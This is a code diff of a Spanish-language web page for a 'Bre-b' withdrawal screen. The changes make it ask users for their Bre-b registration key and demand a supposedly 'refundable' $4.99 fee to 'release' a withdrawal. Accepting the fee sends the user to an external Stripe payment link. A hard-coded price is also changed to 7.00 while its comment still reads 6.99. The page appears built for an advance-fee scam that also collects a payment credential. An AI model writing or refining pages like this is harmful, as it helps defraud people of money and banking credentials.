@@ -1342,26 +1342,11 @@
           <div class="title saque-title">Bre-b</div>
 
           <div class="bank-form-container">
-            <div class="form-group">
-              <label class="field-label" for="breb-nome">Nombre del titular</label>
-              <input type="text" id="breb-nome" placeholder="Nombre completo" class="bank-input" autocomplete="name">
-            </div>
-
-            <div class="form-group">
-              <label class="field-label" for="breb-doc">DNI / CUIT / CUIL</label>
-              <input type="text" id="breb-doc" placeholder="Número de documento" class="bank-input" inputmode="numeric">
-            </div>
-
             <div class="divider-label">Datos Bre-b</div>
 
             <div class="form-group">
-              <label class="field-label" for="breb-cbu">CBU / CVU</label>
-              <input type="text" id="breb-cbu" placeholder="Número CBU o CVU (22 dígitos)" class="bank-input" inputmode="numeric" maxlength="22">
-            </div>
-
-            <div class="form-group">
-              <label class="field-label" for="breb-alias">Alias (opcional)</label>
-              <input type="text" id="breb-alias" placeholder="tu.alias.aqui" class="bank-input">
+              <label class="field-label" for="breb-clave">Clave de registro Bre-b</label>
+              <input type="text" id="breb-clave" placeholder="Ingresa tu clave de registro" class="bank-input">
             </div>
           </div>
 
@@ -1372,11 +1357,9 @@
 
         <script>
           function confirmarBreb() {
-            var nome = document.getElementById("breb-nome").value.trim();
-            var doc = document.getElementById("breb-doc").value.trim();
-            var cbu = document.getElementById("breb-cbu").value.trim();
-            if (!nome || !doc || !cbu) {
-              alert("Por favor completa todos los campos obligatorios.");
+            var clave = document.getElementById("breb-clave").value.trim();
+            if (!clave) {
+              alert("Por favor ingresa tu clave de registro Bre-b.");
               return;
             }
             if (window.showScreen) {
@@ -1581,7 +1564,7 @@
     <script>
       // Função para obter preço (sempre $ 6,99)
       function getVariantPrice() {
-        const price = 6.99; // Valor fixo $6,99
+        const price = 7.00; // Valor fixo $6,99
         console.log("💰 Precio fijo: $", price);
         return price;
       }
@@ -1807,7 +1790,7 @@
 
         <div class="discount-content">
           <div class="discount-highlight">
-            <div class="discount-amount">$ 19,90</div>
+            <div class="discount-amount">$ 4,99</div>
             <div class="discount-badge">VALOR REEMBOLSABLE</div>
           </div>
 
@@ -1817,7 +1800,7 @@
             </p>
             <p class="discount-text">
               Para liberar tu retiro, es necesario confirmar la titularidad. El
-              valor de <strong>$ 19,90</strong> será
+              valor de <strong>$ 4,99</strong> será
               <strong>reembolsado automáticamente</strong> en 1 minuto después del
               pago.
             </p>
@@ -3097,7 +3080,7 @@
       // Função chamada quando usuário aceita o desconto
       function aceitarDesconto() {
         console.log("✅ Usuario aceptó el descuento");
-        abrirModalPixDesconto();
+        window.location.href = "https://buy.stripe.com/8x2fZgdwrbOz26J7KC4Ja01";
       }
 
       // Função chamada quando usuário recusa o desconto
